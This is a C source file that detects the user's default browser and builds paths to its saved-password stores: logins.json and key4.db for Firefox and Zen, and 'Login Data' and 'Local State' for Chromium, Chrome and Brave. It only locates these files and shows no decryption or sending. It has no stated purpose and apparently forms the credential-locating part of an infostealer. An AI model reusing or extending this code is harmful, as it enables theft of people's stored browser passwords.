#define _DEFAULT_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/stat.h>

#define MAX_PATH 1024

// Map browser desktop name to config subpath
const char* get_config_directory(const char* desktop_entry) {
    if (strstr(desktop_entry, "zen")) {
        return "/.zen";
    } else if (strstr(desktop_entry, "firefox")) {
        return "/.mozilla/firefox";
    } else if (strstr(desktop_entry, "chromium")) {
        return "/.config/chromium";
    } else if (strstr(desktop_entry, "brave")) {
        return "/.config/BraveSoftware/Brave-Browser";
    } else if (strstr(desktop_entry, "chrome")) {
        return "/.config/google-chrome";
    }
    return NULL;
}

//  Firefox-style profile => logins.json and key4.db
int get_firefox_credentials(char* logins_path, char* key_db_path) {
    const char *home = getenv("HOME");
    if (!home) return 0;

    char base[MAX_PATH];
    snprintf(base, sizeof(base), "%s/.mozilla/firefox", home);

    DIR *d = opendir(base);
    if (!d) return 0;

    struct dirent *dir;
    while ((dir = readdir(d))) {
        if (dir->d_type == DT_DIR && strstr(dir->d_name, ".default")) {
            snprintf(logins_path, MAX_PATH, "%s/%s/logins.json", base, dir->d_name);
            snprintf(key_db_path, MAX_PATH, "%s/%s/key4.db", base, dir->d_name);
            closedir(d);
            return 1;
        }
    }

    closedir(d);
    return 0;
}


// Chromium-based browsers
int get_chromium_credentials(const char *config_dir, char* login_data, char* local_state) {
    const char *home = getenv("HOME");
    if (!home) return 0;

    snprintf(login_data, MAX_PATH, "%s%s/Default/Login Data", home, config_dir);
    snprintf(local_state, MAX_PATH, "%s%s/Local State", home, config_dir);

#ifdef DEBUG
    printf("Found Chromium credentials:\n  %s\n  %s\n", login_data, local_state);
#endif
    return 1;
}

int detect_credentials(char* output_path1, char* output_path2) {
    FILE *fp;
    char desktop_entry[256] = {0};

    fp = popen("xdg-settings get default-web-browser", "r");
    if (!fp || !fgets(desktop_entry, sizeof(desktop_entry), fp)) {
        if (fp) pclose(fp);
        return 0;
    }
    pclose(fp);
    desktop_entry[strcspn(desktop_entry, "\n")] = 0;

#ifdef DEBUG
    printf("Detected browser .desktop: %s\n", desktop_entry);
#endif

    const char *config_subpath = get_config_directory(desktop_entry);
    if (!config_subpath) return 0;

    if (strstr(config_subpath, "mozilla") || strstr(config_subpath, ".zen")) {
        return get_firefox_credentials(output_path1, output_path2);
    } else {
        return get_chromium_credentials(config_subpath, output_path1, output_path2);
    }
}
